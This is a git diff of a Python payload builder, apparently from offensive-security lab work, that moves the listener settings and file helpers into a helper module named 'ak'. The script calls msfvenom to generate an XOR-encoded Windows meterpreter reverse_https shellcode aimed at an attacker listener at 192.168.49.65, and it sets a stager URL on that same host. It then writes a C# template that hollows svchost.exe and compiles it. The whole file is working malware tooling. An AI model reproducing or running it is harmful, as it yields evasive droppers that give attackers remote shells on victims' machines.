@@ -3,13 +3,14 @@ import ak
 import os
 import subprocess
 
-LHOST = "192.168.49.65"
-LPORT = 443
 BASE_FILENAME = 'win_hollow'
-MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
+FN_CS = BASE_FILENAME + ".cs"
+FN_SHELLCODE = BASE_FILENAME + ".sc"
+
+MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e generic/none"
 SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
 XOR_KEY = b'\x09'
-STAGER_URL = "http://192.168.49.65/sc"
+STAGER_URL = f"http://{ak.LHOST}/sc"
 
 def generate():
   svchost_path = ak.Obfuscator(SVCHOST_PATH, XOR_KEY)
@@ -55,28 +56,16 @@ namespace Hallo
            )
 
   print(template)
-  f = open(BASE_FILENAME + '.cs', "w")
-  f.write(template)
-  f.close()
+  ak.write_file(FN_CS, template)
 
-  print("Wrote "+ BASE_FILENAME + '.cs')
-
-
-def compile():
-  cmd = f"mcs {BASE_FILENAME}.cs"
-  os.system(cmd)
-  print("Wrote "+ BASE_FILENAME + '.exe')
 
 def main():
   shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
 
   generate()
-  compile() 
 
-  f = open(BASE_FILENAME + '.sc', "wb")
-  f.write(shellcode.get_bytes())
-  f.close()
-  print("Wrote shellcode to "+ BASE_FILENAME + '.sc')
+  ak.cs_compile(FN_CS)
+  ak.write_file(FN_SHELLCODE, shellcode.get_bytes())
 
 
 if __name__ == "__main__":
